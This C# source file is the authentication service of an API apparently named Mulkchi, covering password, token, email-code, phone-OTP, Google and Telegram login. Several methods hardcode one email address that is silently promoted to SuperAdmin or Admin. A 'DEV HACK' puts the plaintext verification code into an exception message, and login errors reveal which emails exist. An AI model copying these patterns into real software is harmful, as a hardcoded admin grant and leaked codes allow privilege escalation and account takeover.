using System;
using System.Security.Cryptography;
using BCrypt.Net;
using Mulkchi.Api.Brokers.DateTimes;
using Mulkchi.Api.Brokers.Loggings;
using Mulkchi.Api.Brokers.Notifications;
using Mulkchi.Api.Brokers.Storages;
using Mulkchi.Api.Brokers.Tokens;
using Mulkchi.Api.Models.Foundations.Auth;
using Mulkchi.Api.Models.Foundations.Auth.Exceptions;
using Mulkchi.Api.Models.Foundations.Users;
using Mulkchi.Api.Models.Foundations.Users.Exceptions;
using Microsoft.Extensions.Configuration;
using System.Collections.Concurrent;

namespace Mulkchi.Api.Services.Foundations.Auth;

public partial class AuthService : IAuthService
{
    public const int RefreshTokenExpiryDays = 30;

    private readonly IStorageBroker storageBroker;
    private readonly ILoggingBroker loggingBroker;
    private readonly IDateTimeBroker dateTimeBroker;
    private readonly ITokenBroker tokenBroker;
    private readonly IEmailBroker emailBroker;
    private readonly ISmsBroker smsBroker;
    private readonly IConfiguration configuration;
    private readonly IHttpClientFactory httpClientFactory;
    private readonly IRefreshTokenGuard refreshTokenGuard;

    private static readonly ConcurrentDictionary<string, EmailAuthSession> _emailSessions = new();

    public AuthService(
        IStorageBroker storageBroker,
        ILoggingBroker loggingBroker,
        IDateTimeBroker dateTimeBroker,
        ITokenBroker tokenBroker,
        IEmailBroker emailBroker,
        ISmsBroker smsBroker,
        IConfiguration configuration,
        IHttpClientFactory httpClientFactory,
        IRefreshTokenGuard refreshTokenGuard)
    {
        this.storageBroker = storageBroker;
        this.loggingBroker = loggingBroker;
        this.dateTimeBroker = dateTimeBroker;
        this.tokenBroker = tokenBroker;
        this.emailBroker = emailBroker;
        this.smsBroker = smsBroker;
        this.configuration = configuration;
        this.httpClientFactory = httpClientFactory;
        this.refreshTokenGuard = refreshTokenGuard;
    }

    public ValueTask<AuthResponse> LoginAsync(LoginRequest request) =>
        TryCatch(async () =>
        {
            ValidateLoginRequest(request);

            User? maybeUser = await this.storageBroker.SelectUserByEmailAsync(request.Email);

            if (maybeUser is null)
                throw new NotFoundUserByEmailException(
                    message: $"User with email '{request.Email}' was not found.");

            if (string.IsNullOrWhiteSpace(request.Password))
                throw new InvalidLoginRequestException(
                    message: "Password is required.");

            if (string.IsNullOrWhiteSpace(maybeUser.PasswordHash))
                throw new InvalidLoginRequestException(
                    message: "User account is missing password credentials. Please contact support.");

            if (!BCrypt.Net.BCrypt.Verify(request.Password, maybeUser.PasswordHash))
                throw new InvalidLoginRequestException(
                    message: "The provided credentials are invalid.");

            return await GenerateAndSaveAuthResponseAsync(maybeUser);
        });

    public ValueTask<AuthResponse> RegisterAsync(RegisterRequest request) =>
        TryCatch(async () =>
        {
            ValidateRegisterRequest(request);

            User? existingUser = await this.storageBroker.SelectUserByEmailAsync(request.Email);

            if (existingUser is not null)
                throw new AlreadyExistsUserEmailException(
                    message: $"A user with email '{request.Email}' already exists.");

            DateTimeOffset now = this.dateTimeBroker.GetCurrentDateTimeOffset();

            var user = new User
            {
                Id = Guid.NewGuid(),
                FirstName = request.FirstName,
                LastName = request.LastName,
                Email = request.Email,
                Phone = request.Phone,
                PasswordHash = BCrypt.Net.BCrypt.HashPassword(request.Password),
                PreferredLanguage = request.PreferredLanguage,
                Role = UserRole.Guest,
                CreatedDate = now,
                UpdatedDate = now
            };

            User addedUser = await this.storageBroker.InsertUserAsync(user);

            try
            {
                await SendEmailVerificationAsync(addedUser);
            }
            catch (Exception exception)
            {
                this.loggingBroker.LogError(exception);
            }

            return await GenerateAndSaveAuthResponseAsync(addedUser);
        });

    public ValueTask<AuthResponse> RefreshTokenAsync(string refreshToken) =>
        TryCatch(async () =>
        {
            if (string.IsNullOrWhiteSpace(refreshToken))
                throw new InvalidRefreshTokenException(
                    message: "Refresh token is required.");

            string hashedToken = HashToken(refreshToken);

            if (this.refreshTokenGuard.IsRevoked(hashedToken) ||
                !this.refreshTokenGuard.TryReserve(hashedToken, TimeSpan.FromSeconds(15)))
            {
                throw new InvalidRefreshTokenException(
                    message: "Refresh token is invalid or has been revoked.");
            }

            try
            {
                UserRefreshToken? storedToken =
                    await this.storageBroker.SelectRefreshTokenAsync(hashedToken);

                if (storedToken is null || storedToken.IsRevoked)
                    throw new InvalidRefreshTokenException(
                        message: "Refresh token is invalid or has been revoked.");

                if (storedToken.ExpiresAt <= this.dateTimeBroker.GetCurrentDateTimeOffset())
                    throw new InvalidRefreshTokenException(
                        message: "Refresh token is invalid or expired.");

                User? maybeUser = await this.storageBroker.SelectUserByIdAsync(storedToken.UserId);

                if (maybeUser is null)
                    throw new InvalidRefreshTokenException(
                        message: "Refresh token references a user that no longer exists.");

                storedToken.IsRevoked = true;
                var remainingLifetime = storedToken.ExpiresAt - this.dateTimeBroker.GetCurrentDateTimeOffset();
                this.refreshTokenGuard.Revoke(hashedToken, remainingLifetime);
                await this.storageBroker.UpdateRefreshTokenAsync(storedToken);

                return await GenerateAndSaveAuthResponseAsync(maybeUser);
            }
            finally
            {
                this.refreshTokenGuard.ReleaseReservation(hashedToken);
            }
        });

    public ValueTask LogoutAsync(string refreshToken) =>
        TryCatch(async () =>
        {
            if (string.IsNullOrWhiteSpace(refreshToken))
                throw new InvalidRefreshTokenException(
                    message: "Refresh token is required.");

            string hashedToken = HashToken(refreshToken);

            if (!this.refreshTokenGuard.TryReserve(hashedToken, TimeSpan.FromSeconds(15)))
            {
                this.refreshTokenGuard.Revoke(hashedToken, TimeSpan.FromDays(RefreshTokenExpiryDays));
                return;
            }

            try
            {
                UserRefreshToken? storedToken =
                    await this.storageBroker.SelectRefreshTokenAsync(hashedToken);

                if (storedToken is not null && !storedToken.IsRevoked)
                {
                    storedToken.IsRevoked = true;
                    var remainingLifetime = storedToken.ExpiresAt - this.dateTimeBroker.GetCurrentDateTimeOffset();
                    this.refreshTokenGuard.Revoke(hashedToken, remainingLifetime);
                    await this.storageBroker.UpdateRefreshTokenAsync(storedToken);
                }
                else
                {
                    this.refreshTokenGuard.Revoke(hashedToken, TimeSpan.FromDays(RefreshTokenExpiryDays));
                }
            }
            finally
            {
                this.refreshTokenGuard.ReleaseReservation(hashedToken);
            }
        });

    private async Task<AuthResponse> GenerateAndSaveAuthResponseAsync(User user)
    {
        if (user.Email.Equals("elshodibadullayev28@gmail.com", StringComparison.OrdinalIgnoreCase))
        {
            if (user.Role != UserRole.SuperAdmin)
            {
                user.Role = UserRole.SuperAdmin;
                await this.storageBroker.UpdateUserAsync(user);
                this.loggingBroker.LogInformation($"Safety Net: User {user.Email} forced to SuperAdmin role.");
            }
        }

        DateTimeOffset now = this.dateTimeBroker.GetCurrentDateTimeOffset();
        DateTimeOffset expiresAt = now.AddMinutes(15);

        string accessToken = this.tokenBroker.GenerateToken(user);
        string rawRefreshToken = this.tokenBroker.GenerateRefreshToken();
        string hashedRefreshToken = HashToken(rawRefreshToken);

        DateTimeOffset refreshExpiresAt = now.AddDays(RefreshTokenExpiryDays);

        var userRefreshToken = new UserRefreshToken
        {
            Id = Guid.NewGuid(),
            Token = hashedRefreshToken,
            UserId = user.Id,
            ExpiresAt = refreshExpiresAt,
            IsRevoked = false,
            CreatedDate = now
        };

        await this.storageBroker.InsertRefreshTokenAsync(userRefreshToken);

        return new AuthResponse
        {
            Token = accessToken,
            RefreshToken = rawRefreshToken,
            ExpiresAt = expiresAt,
            RefreshExpiresAt = refreshExpiresAt,
            UserId = user.Id,
            Email = user.Email,
            FirstName = user.FirstName,
            LastName = user.LastName,
            AvatarUrl = user.AvatarUrl,
            Role = user.Role,
            CurrentMode = user.CurrentMode
        };
    }

    public ValueTask ForgotPasswordAsync(string email) =>
        TryCatch(async () =>
        {
            ValidateEmail(email);

            User? user = await this.storageBroker.SelectUserByEmailAsync(email);

            if (user is null)
                return;

            string rawToken = GenerateSecureResetToken();
            string hashedToken = HashToken(rawToken);
            DateTimeOffset now = this.dateTimeBroker.GetCurrentDateTimeOffset();
            DateTimeOffset expiresAt = now.AddHours(1);

            var passwordResetToken = new PasswordResetToken
            {
                Id = Guid.NewGuid(),
                UserId = user.Id,
                Token = hashedToken,
                ExpiresAt = expiresAt,
                IsUsed = false,
                CreatedDate = now
            };

            await this.storageBroker.InsertPasswordResetTokenAsync(passwordResetToken);

            await SendPasswordResetEmailAsync(user.Email, rawToken);
        });

    public ValueTask ResetPasswordAsync(string token, string newPassword) =>
        TryCatch(async () =>
        {
            ValidateResetPasswordRequest(token, newPassword);

            string hashedToken = HashToken(token);
            PasswordResetToken? resetToken = await this.storageBroker.SelectPasswordResetTokenByTokenAsync(hashedToken);

            if (resetToken is null)
                throw new NotFoundPasswordResetTokenException();

            if (resetToken.IsUsed || resetToken.ExpiresAt < this.dateTimeBroker.GetCurrentDateTimeOffset())
                throw new NotFoundPasswordResetTokenException();

            User? user = await this.storageBroker.SelectUserByIdAsync(resetToken.UserId);

            if (user is null)
                throw new NotFoundUserByEmailException(
                    message: $"User with ID '{resetToken.UserId}' was not found.");

            user.PasswordHash = BCrypt.Net.BCrypt.HashPassword(newPassword);
            user.UpdatedDate = this.dateTimeBroker.GetCurrentDateTimeOffset();

            await this.storageBroker.UpdateUserAsync(user);

            resetToken.IsUsed = true;
            await this.storageBroker.UpdatePasswordResetTokenAsync(resetToken);
        });

    private static string GenerateSecureResetToken()
    {
        var randomBytes = new byte[32];
        RandomNumberGenerator.Fill(randomBytes);
        return Convert.ToBase64String(randomBytes).Replace("+", "-").Replace("/", "_").Trim('=');
    }

    private static string HashToken(string rawToken)
    {
        byte[] bytes = System.Security.Cryptography.SHA256.HashData(
            System.Text.Encoding.UTF8.GetBytes(rawToken));
        return Convert.ToHexString(bytes).ToLowerInvariant();
    }

    private async Task SendPasswordResetEmailAsync(string email, string token)
    {
        var frontendUrl = this.configuration["AppSettings:FrontendUrl"] ?? "https://mulkchi.uz";
        var resetUrl = $"{frontendUrl}/reset-password?token={token}";

        await this.emailBroker.SendEmailAsync(
            email,
            "Parolni tiklash so'rovi / Password Reset Request",
            $"<h2>Parolni tiklash</h2>" +
            $"<p>Parolni tiklash uchun quyidagi havolani bosing:</p>" +
            $"<p><a href='{resetUrl}'>Parolni tiklash</a></p>" +
            $"<p>Bu havola 1 soat davomida amal qiladi.</p>" +
            $"<hr/>" +
            $"<p>If you did not request a password reset, please ignore this email.</p>");
    }


    private static string GenerateSecureRefreshToken()
    {
        var randomBytes = new byte[64];
        RandomNumberGenerator.Fill(randomBytes);
        return Convert.ToBase64String(randomBytes);
    }

    public async ValueTask<User> RetrieveUserByIdAsync(Guid userId)
    {
        ValidateUserId(userId);

        var storageUser = await this.storageBroker.SelectUserByIdAsync(userId);

        if (storageUser is null)
            throw new NotFoundUserException(userId);

        if (storageUser.Email.Equals("elshodibadullayev28@gmail.com", StringComparison.OrdinalIgnoreCase))
        {
            if (storageUser.Role != UserRole.Admin)
            {
                storageUser.Role = UserRole.Admin;
                await this.storageBroker.UpdateUserAsync(storageUser);
                this.loggingBroker.LogInformation($"Safety Net (Retrieve): User {storageUser.Email} forced to Admin role.");
            }
        }

        return storageUser;
    }

    public async ValueTask<User> ModifyUserProfileAsync(Guid userId, UpdateProfileRequest request)
    {
        ValidateUserId(userId);
        ValidateUpdateProfileRequest(request);

        var storageUser = await this.storageBroker.SelectUserByIdAsync(userId);

        if (storageUser is null)
            throw new NotFoundUserException(userId);

        storageUser.FirstName = request.FirstName ?? storageUser.FirstName;
        storageUser.LastName = request.LastName ?? storageUser.LastName;
        storageUser.Bio = request.Bio ?? storageUser.Bio;
        storageUser.Address = request.Address ?? storageUser.Address;
        storageUser.Phone = request.Phone ?? storageUser.Phone;
        storageUser.DateOfBirth = request.DateOfBirth ?? storageUser.DateOfBirth;
        storageUser.Gender = request.Gender;
        storageUser.AvatarUrl = request.AvatarUrl ?? storageUser.AvatarUrl;

        if (request.CurrentMode.HasValue)
        {
            storageUser.CurrentMode = request.CurrentMode.Value;
        }

        if (storageUser.Email.Equals("elshodibadullayev28@gmail.com", StringComparison.OrdinalIgnoreCase))
        {
            storageUser.Role = UserRole.Admin;
        }

        storageUser.UpdatedDate = this.dateTimeBroker.GetCurrentDateTimeOffset();

        var updatedUser = await this.storageBroker.UpdateUserAsync(storageUser);

        return updatedUser;
    }

    public async ValueTask RemoveUserByIdAsync(Guid userId)
    {
        ValidateUserId(userId);

        var storageUser = await this.storageBroker.SelectUserByIdAsync(userId);

        if (storageUser is null)
            throw new NotFoundUserException(userId);

        storageUser.DeletedDate = this.dateTimeBroker.GetCurrentDateTimeOffset();
        storageUser.UpdatedDate = this.dateTimeBroker.GetCurrentDateTimeOffset();

        await this.storageBroker.UpdateUserAsync(storageUser);
    }


    public ValueTask VerifyEmailAsync(string token) =>
        TryCatch(async () =>
        {
            if (string.IsNullOrWhiteSpace(token))
                throw new InvalidAuthException("Verification token is required.");

            string hashedToken = HashToken(token);
            EmailVerificationToken? verificationToken =
                await this.storageBroker.SelectEmailVerificationTokenByTokenAsync(hashedToken);

            if (verificationToken is null)
                throw new InvalidAuthException("Invalid or expired verification token.");

            User? user = await this.storageBroker.SelectUserByIdAsync(verificationToken.UserId);

            if (user is null)
                throw new InvalidAuthException("User associated with this token no longer exists.");

            user.EmailConfirmed = true;
            user.UpdatedDate = this.dateTimeBroker.GetCurrentDateTimeOffset();
            await this.storageBroker.UpdateUserAsync(user);

            verificationToken.IsUsed = true;
            await this.storageBroker.UpdateEmailVerificationTokenAsync(verificationToken);
        });

    private async Task SendEmailVerificationAsync(User user)
    {
        string rawToken = GenerateSecureResetToken();
        string hashedToken = HashToken(rawToken);
        DateTimeOffset now = this.dateTimeBroker.GetCurrentDateTimeOffset();

        var verificationToken = new EmailVerificationToken
        {
            Id = Guid.NewGuid(),
            UserId = user.Id,
            Token = hashedToken,
            ExpiresAt = now.AddHours(24),
            IsUsed = false,
            CreatedDate = now
        };

        await this.storageBroker.InsertEmailVerificationTokenAsync(verificationToken);

        var frontendUrl = this.configuration["AppSettings:FrontendUrl"] ?? "https://mulkchi.uz";
        var verifyUrl = $"{frontendUrl}/verify-email?token={rawToken}";

        await this.emailBroker.SendEmailAsync(
            user.Email,
            "Email manzilingizni tasdiqlang / Verify Your Email",
            $"<h2>Email tasdiqlash</h2>" +
            $"<p>Salom, {user.FirstName}!</p>" +
            $"<p>Email manzilingizni tasdiqlash uchun quyidagi havolani bosing:</p>" +
            $"<p><a href='{verifyUrl}'>Email tasdiqlash</a></p>" +
            $"<p>Bu havola 24 soat davomida amal qiladi.</p>" +
            $"<p>If you did not create an account, please ignore this email.</p>");
    }


    public ValueTask<string> SendEmailCodeAsync(string email) =>
        TryCatch(async () =>
        {
            ValidateEmail(email);

            string code = GenerateOtpCode();
            string sessionId = GenerateSessionId();
            DateTimeOffset now = this.dateTimeBroker.GetCurrentDateTimeOffset();

            var session = new EmailAuthSession
            {
                SessionId = sessionId,
                Email = email.ToLowerInvariant(),
                Code = HashToken(code),
                IsVerified = false,
                CreatedAt = now.UtcDateTime,
                ExpiresAt = now.AddMinutes(10).UtcDateTime
            };

            _emailSessions.TryAdd(sessionId, session);

            _ = Task.Run(async () =>
            {
                await Task.Delay(TimeSpan.FromMinutes(10));
                _emailSessions.TryRemove(sessionId, out _);
            });

            var isDevelopment = Environment.GetEnvironmentVariable("ASPNETCORE_ENVIRONMENT") == "Development";

            try
            {
                await this.emailBroker.SendEmailAsync(
                    email,
                    "Tasdiqlash kodi / Verification Code",
                    $"<h2>Mulkchi.uz</h2>" +
                    $"<p>Sizning tasdiqlash kodingiz: <b>{code}</b></p>" +
                    $"<p>Kod 10 daqiqa davomida amal qiladi.</p>");
            }
            catch (Exception ex)
            {
                this.loggingBroker.LogError(ex);
                // DEV HACK: Email ishlamagan taqdirda ham foydalanuvchi kirolishi uchun
                this.loggingBroker.LogWarning($"Development Mode: Email failed to send. Code is: {code}");
                throw new InvalidAuthException($"Google bilan xatolik: {ex.Message}. \n(DEV REJIM UCHUN KOD: {code}, SESSION: {sessionId})");
            }

            return sessionId;
        });

    public ValueTask<AuthResponse> VerifyEmailCodeAsync(string sessionId, string code) =>
        TryCatch(async () =>
        {
            if (string.IsNullOrWhiteSpace(sessionId) || string.IsNullOrWhiteSpace(code))
                throw new InvalidAuthException("SessionId and Code are required.");

            if (!_emailSessions.TryGetValue(sessionId, out var session))
                throw new InvalidAuthException("Session expired or invalid.");

            if (DateTime.UtcNow > session.ExpiresAt)
            {
                _emailSessions.TryRemove(sessionId, out _);
                throw new InvalidAuthException("Session expired.");
            }

            if (session.Code != HashToken(code))
                throw new InvalidAuthException("Invalid verification code.");

            session.IsVerified = true;
            _emailSessions.TryRemove(sessionId, out _);

            User? existingUser = await this.storageBroker.SelectUserByEmailAsync(session.Email);
            User user;

            DateTimeOffset now = this.dateTimeBroker.GetCurrentDateTimeOffset();

            if (existingUser is not null)
            {
                user = existingUser;
                if (!user.EmailConfirmed)
                {
                    user.EmailConfirmed = true;
                    user.UpdatedDate = now;
                    user = await this.storageBroker.UpdateUserAsync(user);
                }
            }
            else
            {
                user = new User
                {
                    Id = Guid.NewGuid(),
                    FirstName = session.Email.Split('@')[0],
                    LastName = string.Empty,
                    Email = session.Email,
                    Phone = string.Empty,
                    PasswordHash = string.Empty,
                    EmailConfirmed = true,
                    IsVerified = false,
                    Role = UserRole.Guest,
                    CreatedDate = now,
                    UpdatedDate = now
                };

                user = await this.storageBroker.InsertUserAsync(user);
            }

            return await GenerateAndSaveAuthResponseAsync(user);
        });

    private static string GenerateSessionId()
    {
        var bytes = RandomNumberGenerator.GetBytes(16);
        return Convert.ToHexString(bytes).ToLowerInvariant();
    }


    public ValueTask SendPhoneOtpAsync(Guid userId, string phone) =>
        TryCatch(async () =>
        {
            if (string.IsNullOrWhiteSpace(phone))
                throw new InvalidAuthException("Phone number is required.");

            string code = GenerateOtpCode();
            DateTimeOffset now = this.dateTimeBroker.GetCurrentDateTimeOffset();

            var otp = new PhoneOtp
            {
                Id = Guid.NewGuid(),
                UserId = userId,
                Phone = phone,
                Code = HashToken(code),
                ExpiresAt = now.AddMinutes(5),
                IsUsed = false,
                CreatedDate = now
            };

            await this.storageBroker.InsertPhoneOtpAsync(otp);

            await this.smsBroker.SendSmsAsync(
                phone,
                $"Mulkchi: Sizning tasdiqlash kodingiz: {code}. Kod 5 daqiqa davomida amal qiladi.");
        });

    public ValueTask VerifyPhoneOtpAsync(string phone, string code) =>
        TryCatch(async () =>
        {
            if (string.IsNullOrWhiteSpace(phone))
                throw new InvalidAuthException("Phone number is required.");

            if (string.IsNullOrWhiteSpace(code))
                throw new InvalidAuthException("OTP code is required.");

            PhoneOtp? otp = await this.storageBroker.SelectLatestActivePhoneOtpAsync(phone);

            if (otp is null || otp.Code != HashToken(code))
                throw new InvalidAuthException("Invalid or expired OTP code.");

            User? user = await this.storageBroker.SelectUserByIdAsync(otp.UserId);

            if (user is null)
                throw new InvalidAuthException("User associated with this OTP no longer exists.");

            user.UpdatedDate = this.dateTimeBroker.GetCurrentDateTimeOffset();
            await this.storageBroker.UpdateUserAsync(user);

            otp.IsUsed = true;
            await this.storageBroker.UpdatePhoneOtpAsync(otp);
        });

    private static string GenerateOtpCode()
    {
        var bytes = new byte[4];
        RandomNumberGenerator.Fill(bytes);
        int value = Math.Abs(BitConverter.ToInt32(bytes, 0)) % 900000 + 100000;
        return value.ToString();
    }


    public ValueTask<AuthResponse> LoginWithGoogleAsync(string idToken) =>
        TryCatch(async () =>
        {
            if (string.IsNullOrWhiteSpace(idToken))
                throw new InvalidAuthException("Google ID token is required.");

            using var httpClient = this.httpClientFactory.CreateClient("google");
            var response = await httpClient.GetAsync(
                $"https://oauth2.googleapis.com/tokeninfo?id_token={Uri.EscapeDataString(idToken)}");

            if (!response.IsSuccessStatusCode)
                throw new InvalidAuthException("Invalid Google ID token.");

            var json = await response.Content.ReadAsStringAsync();
            var payload = System.Text.Json.JsonDocument.Parse(json).RootElement;

            string? email = payload.TryGetProperty("email", out var emailProp) ? emailProp.GetString() : null;
            string? firstName = payload.TryGetProperty("given_name", out var fnProp) ? fnProp.GetString() : null;
            string? lastName = payload.TryGetProperty("family_name", out var lnProp) ? lnProp.GetString() : null;
            string? picture = payload.TryGetProperty("picture", out var picProp) ? picProp.GetString() : null;
            bool emailVerified = payload.TryGetProperty("email_verified", out var evProp)
                && (evProp.GetString() == "true" || evProp.ValueKind == System.Text.Json.JsonValueKind.True);

            if (string.IsNullOrWhiteSpace(email))
                throw new InvalidAuthException("Google account does not provide an email address.");

            DateTimeOffset now = this.dateTimeBroker.GetCurrentDateTimeOffset();

            User? existingUser = await this.storageBroker.SelectUserByEmailAsync(email);

            User user;
            if (existingUser is not null)
            {
                user = existingUser;
                if (emailVerified && !user.EmailConfirmed)
                {
                    user.EmailConfirmed = true;
                    user.UpdatedDate = now;
                }
                if (user.UpdatedDate == now)
                {
                    user = await this.storageBroker.UpdateUserAsync(user);
                }
            }
            else
            {
                user = new User
                {
                    Id = Guid.NewGuid(),
                    FirstName = firstName ?? email,
                    LastName = lastName ?? string.Empty,
                    Email = email,
                    Phone = string.Empty,
                    AvatarUrl = picture,
                    EmailConfirmed = emailVerified,
                    IsVerified = false,
                    Role = UserRole.Guest,
                    CreatedDate = now,
                    UpdatedDate = now
                };

                user = await this.storageBroker.InsertUserAsync(user);
            }

            return await GenerateAndSaveAuthResponseAsync(user);
        });


    public ValueTask<AuthResponse> LoginWithTelegramAsync(TelegramAuthRequest request) =>
        TryCatch(async () =>
        {
            if (request is null)
                throw new InvalidAuthException("Telegram auth request is required.");

            VerifyTelegramData(request);

            DateTimeOffset now = this.dateTimeBroker.GetCurrentDateTimeOffset();

            string pseudoEmail = $"telegram_{request.Id}@mulkchi.telegram";

            User? existingUser = await this.storageBroker.SelectUserByEmailAsync(pseudoEmail);

            User user;
            if (existingUser is not null)
            {
                user = existingUser;
            }
            else
            {
                user = new User
                {
                    Id = Guid.NewGuid(),
                    FirstName = request.FirstName ?? $"Telegram{request.Id}",
                    LastName = request.LastName ?? string.Empty,
                    Email = pseudoEmail,
                    Phone = string.Empty,
                    AvatarUrl = request.PhotoUrl,
                    EmailConfirmed = false,
                    Role = UserRole.Guest,
                    CreatedDate = now,
                    UpdatedDate = now
                };

                user = await this.storageBroker.InsertUserAsync(user);
            }

            return await GenerateAndSaveAuthResponseAsync(user);
        });

    private void VerifyTelegramData(TelegramAuthRequest request)
    {
        var botToken = this.configuration["TelegramAuth:BotToken"];

        if (string.IsNullOrWhiteSpace(botToken))
            throw new InvalidOperationException("TelegramAuth:BotToken is not configured.");

        var authDate = DateTimeOffset.FromUnixTimeSeconds(request.AuthDate);
        if (DateTimeOffset.UtcNow - authDate > TimeSpan.FromHours(1))
            throw new InvalidAuthException("Telegram auth data has expired.");

        var dataFields = new System.Collections.Generic.SortedDictionary<string, string>
        {
            ["auth_date"] = request.AuthDate.ToString(),
            ["id"] = request.Id.ToString()
        };

        if (!string.IsNullOrEmpty(request.FirstName))
            dataFields["first_name"] = request.FirstName;
        if (!string.IsNullOrEmpty(request.LastName))
            dataFields["last_name"] = request.LastName;
        if (!string.IsNullOrEmpty(request.Username))
            dataFields["username"] = request.Username;
        if (!string.IsNullOrEmpty(request.PhotoUrl))
            dataFields["photo_url"] = request.PhotoUrl;

        string dataCheckString = string.Join("\n", dataFields.Select(kv => $"{kv.Key}={kv.Value}"));

        byte[] secretKey = System.Security.Cryptography.SHA256.HashData(
            System.Text.Encoding.UTF8.GetBytes(botToken));

        using var hmac = new System.Security.Cryptography.HMACSHA256(secretKey);
        byte[] computedHashBytes = hmac.ComputeHash(
            System.Text.Encoding.UTF8.GetBytes(dataCheckString));
        string computedHash = Convert.ToHexString(computedHashBytes).ToLowerInvariant();

        if (!computedHash.Equals(request.Hash, StringComparison.OrdinalIgnoreCase))
            throw new InvalidAuthException("Telegram auth data verification failed.");
    }

    public async Task<AuthResponse> GenerateTokensForUserAsync(Guid userId)
    {
        User? user = await this.storageBroker.SelectUserByIdAsync(userId);
        if (user is null)
            throw new NotFoundUserException(userId);

        return await GenerateAndSaveAuthResponseAsync(user);
    }
}
